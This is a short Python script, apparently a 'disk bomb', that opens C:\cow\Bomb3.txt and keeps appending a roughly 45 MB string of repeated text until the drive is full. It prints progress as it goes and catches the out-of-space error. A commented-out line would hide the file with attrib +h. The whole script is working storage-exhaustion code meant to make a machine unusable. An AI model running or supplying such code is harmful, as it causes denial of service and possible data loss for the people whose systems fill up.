import os,sys,time

def main():
	#The higher the BombText number is, the less recursions it requires to fill up a drive
	BombText = ("Bombs"*9000000)
	filename = "C:\\cow\\Bomb3.txt"
	f = open ("C:\\cow\\Bomb3.txt","w")
	#p = os.popen('attrib +h ' + filename)
	#p.close()
	try:
		for i in range (1,99000):
			sizeGb = os.path.getsize("C:\\cow\\Bomb3.txt") >> 20
			print (sizeGb, "Mb | ", i, "recursions")
			f.write(BombText)
			
#-------------------Error handling---------------------#
	except OSError:
		print ("[*]Drive is currently full.")
		time.sleep(3)
	except KeyboardInterrupt:
		print ("[*]Keyboard interrupt (ctrl+c)")
		time.sleep(3)
#------------------Done error handling------------------#
main();
